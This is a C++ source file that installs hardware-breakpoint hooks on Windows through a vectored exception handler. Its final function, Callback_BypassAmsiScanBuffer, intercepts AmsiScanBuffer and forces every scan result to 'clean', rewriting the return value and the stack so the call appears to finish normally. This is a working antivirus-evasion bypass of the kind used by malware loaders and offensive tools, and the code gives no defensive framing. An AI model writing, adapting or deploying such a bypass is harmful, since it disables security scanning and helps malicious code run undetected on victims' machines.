#include "stdafx.h"
#include "veh_hooks.h"
#include "logger.h"
#include <mutex>

namespace VehHooks {

struct HookEntry {
    PVOID address;
    VehHookCallback callback;
    int drRegisterIndex; // 0, 1, 2, or 3
};

namespace {

PVOID g_vehHandle = nullptr;
std::vector<HookEntry> g_hooks;
std::mutex g_mutex;

// Set hardware breakpoint in a given context structure
void SetHardwareBreakpoint(PCONTEXT ctx, PVOID targetAddr, int drIndex) {
    if (drIndex < 0 || drIndex > 3) return;

    // Set the specific Debug Register to the target address
    if (drIndex == 0) ctx->Dr0 = (DWORD64)targetAddr;
    if (drIndex == 1) ctx->Dr1 = (DWORD64)targetAddr;
    if (drIndex == 2) ctx->Dr2 = (DWORD64)targetAddr;
    if (drIndex == 3) ctx->Dr3 = (DWORD64)targetAddr;

    // Enable the DRx in DR7 (Local enable for DRx is bit 2*x)
    // Execution break = 00 in LEN and R/W bits, so just setting the local enable is enough
    ctx->Dr7 |= (1ULL << (2 * drIndex));
}

// Clear hardware breakpoint in a given context structure
void ClearHardwareBreakpoint(PCONTEXT ctx, int drIndex) {
    if (drIndex < 0 || drIndex > 3) return;

    if (drIndex == 0) ctx->Dr0 = 0;
    if (drIndex == 1) ctx->Dr1 = 0;
    if (drIndex == 2) ctx->Dr2 = 0;
    if (drIndex == 3) ctx->Dr3 = 0;

    // Disable the DRx in DR7
    ctx->Dr7 &= ~(1ULL << (2 * drIndex));
}

LONG WINAPI VehHandler(PEXCEPTION_POINTERS exceptionInfo) {
    if (exceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        PCONTEXT ctx = exceptionInfo->ContextRecord;
        
        // Find which hook caused this exception by matching the instruction pointer
#ifdef _M_AMD64
        DWORD64 ip = ctx->Rip;
#elif defined(_M_IX86)
        DWORD ip = ctx->Eip;
#endif

        VehHookCallback cb = nullptr;
        {
            std::lock_guard<std::mutex> lock(g_mutex);
            for (const auto& hook : g_hooks) {
                if ((DWORD64)hook.address == ip) {
                    cb = hook.callback;
                    break;
                }
            }
        }

        if (cb) {
            // Call the callback. The callback will modify the context (e.g., skip 
            // the instruction, set return value, etc.)
            if (cb(ctx)) {
                // Resume Flag must be set in EFLAGS to avoid breaking again on the same instruction
                ctx->EFlags |= (1 << 16); // Set RF flag
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

} // namespace

bool InstallHardwareHook(PVOID targetAddress, VehHookCallback callback) {
    std::lock_guard<std::mutex> lock(g_mutex);

    if (g_hooks.size() >= 4) {
        LOG(L"VehHooks: Maximum hardware hooks (4) reached.");
        return false;
    }

    for (const auto& hook : g_hooks) {
        if (hook.address == targetAddress) {
            LOG(L"VehHooks: Hook already installed at %p", targetAddress);
            return false;
        }
    }

    // Assign next available DR index
    bool drUsed[4] = {false, false, false, false};
    for (const auto& hook : g_hooks) {
        drUsed[hook.drRegisterIndex] = true;
    }

    int drIndex = -1;
    for (int i = 0; i < 4; i++) {
        if (!drUsed[i]) {
            drIndex = i;
            break;
        }
    }

    if (drIndex == -1) return false;

    if (!g_vehHandle) {
        g_vehHandle = AddVectoredExceptionHandler(1, VehHandler);
        if (!g_vehHandle) {
            LOG(L"VehHooks: Failed to register VEH.");
            return false;
        }
    }

    g_hooks.push_back({ targetAddress, callback, drIndex });

    // Apply the hardware breakpoint to the current thread
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();

    if (GetThreadContext(hThread, &ctx)) {
        SetHardwareBreakpoint(&ctx, targetAddress, drIndex);
        SetThreadContext(hThread, &ctx);
        VERBOSE(L"VehHooks: Installed HW hook on DR%d at %p", drIndex, targetAddress);
        return true;
    }

    g_hooks.pop_back();
    return false;
}

bool UninstallHardwareHook(PVOID targetAddress) {
    std::lock_guard<std::mutex> lock(g_mutex);

    auto it = g_hooks.begin();
    while (it != g_hooks.end()) {
        if (it->address == targetAddress) {
            
            CONTEXT ctx = { 0 };
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            HANDLE hThread = GetCurrentThread();

            if (GetThreadContext(hThread, &ctx)) {
                ClearHardwareBreakpoint(&ctx, it->drRegisterIndex);
                SetThreadContext(hThread, &ctx);
            }

            g_hooks.erase(it);
            VERBOSE(L"VehHooks: Uninstalled HW hook at %p", targetAddress);

            if (g_hooks.empty() && g_vehHandle) {
                RemoveVectoredExceptionHandler(g_vehHandle);
                g_vehHandle = nullptr;
            }
            return true;
        }
        ++it;
    }
    return false;
}

bool UninstallAll() {
    std::lock_guard<std::mutex> lock(g_mutex);

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();

    if (GetThreadContext(hThread, &ctx)) {
        for (auto& hook : g_hooks) {
            ClearHardwareBreakpoint(&ctx, hook.drRegisterIndex);
        }
        SetThreadContext(hThread, &ctx);
    }

    g_hooks.clear();
    
    if (g_vehHandle) {
        RemoveVectoredExceptionHandler(g_vehHandle);
        g_vehHandle = nullptr;
    }

    VERBOSE(L"VehHooks: Uninstalled all hardware hooks.");
    return true;
}

bool Callback_BypassAmsiScanBuffer(PCONTEXT pContext) {
#ifdef _M_AMD64
    // AmsiScanBuffer parameters in x64:
    // RCX: amsiContext, RDX: buffer, R8: length, R9: contentName, Stack: amsiSession, result
    
    // Fast fail: We want to set the `result` out-parameter to AMSI_RESULT_CLEAN
    // The `result` pointer is the 6th argument, meaning it's on the stack at RSP+0x30
    // (after the return address and 4 shadow space parameters).
    PDWORD pResult = *(PDWORD*)(pContext->Rsp + 0x30);
    if (pResult) {
        // AMSI_RESULT_CLEAN is 0
        *pResult = 0; 
    }

    // Set return value (HRESULT) to S_OK (0)
    pContext->Rax = 0;

    // Simulate returning from the function
    // Pop the return address off the stack and put it in Rip
    pContext->Rip = *(DWORD64*)(pContext->Rsp);
    pContext->Rsp += sizeof(DWORD64);
    
    return true;
#else
    // Add x86 support here if needed
    return false;
#endif
}

} // namespace VehHooks
